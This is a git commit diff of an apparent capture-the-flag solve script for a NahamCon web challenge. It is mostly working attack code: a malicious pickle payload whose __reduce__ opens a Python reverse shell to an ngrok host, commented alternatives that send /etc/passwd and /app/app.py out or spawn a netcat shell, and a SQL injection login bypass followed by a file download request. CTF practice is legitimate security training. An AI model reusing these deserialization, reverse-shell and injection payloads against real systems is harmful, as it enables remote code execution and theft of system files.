7d53a352f2e1884a3d5fcd477119274930b17607
Hssain Aitkadir <hssain.aitkadir@gmail.com>
2023-06-17 23:17:21 +0100

    Update: some unnicesiry stuff removed from script

--- Transfer/solve.py
+++ Transfer/solve.py
@@ -7,50 +7,30 @@ import os
 import random
 import string
 
-
-
-
 def generate_random_string(length):
 	characters = string.ascii_letters
 	return ''.join(random.choice(characters) for _ in range(length))
 
-
-
-
 class RCE:
 	def __reduce__(self):
-		# cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
-		# cmd = ('nc 4.tcp.eu.ngrok.io 18312')
-		# cmd = ("python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));s.send(open('/app/app.py','rb').read())\"")
+		# first request I tried 
+		# cmd = ("python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));s.send(open('/etc/passwd','rb').read())\"")
 		cmd = ("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"")
 		return os.system, (cmd,)
-
-
-
-# pickled = pickle.dumps(RCE())
-# cmd = base64.urlsafe_b64encode(pickled)
-
 
 command = base64.b64encode(pickle.dumps(RCE())).decode('utf-8')
 
 print(command)
-
-
-
-
-
 
 def DBClean(string):
 	for bad_char in " '\"":
 		string = string.replace(bad_char,"")
 	return string.replace("\\", "'")
 
-
 password = "pass"
 session_id = str(uuid.uuid4())
 # session_id = "e1f08f54-5d63-4199-a3d8-7083597647dc"
 session = f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')"
-
 
 filename = generate_random_string(5)
 print(filename)
@@ -63,21 +43,13 @@ password = input.replace(" ", "/**/").replace("'","\\")
 print(password)
 user = 'admin'
 
-
 sql = f"SELECT * FROM users WHERE username='{DBClean(user)}' AND password='{DBClean(password)}'"
 print('\n=================================================================\n')
 print(sql)
 
-
-
-
-
-
-
-
 url = 'http://challenge.nahamcon.com:30939/login'
 data = {
-	'username': 'adminn',
+	'username': 'adminnnn',
 	'password': password
 }
 
@@ -87,7 +59,7 @@ if response.status_code == 200:
 	print(response.text)
 
 
-	print("\n\n++++++++++++++++++ try reading flag ++++++++++++++++++++++\n\n")
+	print("\n\n++++++++++++++++++++++++++++++++++++++++\n\n")
 	url = 'http://challenge.nahamcon.com:30939/download/' + filename +'/' + session_id
 	response = requests.get(url)
 	if response.status_code == 200:
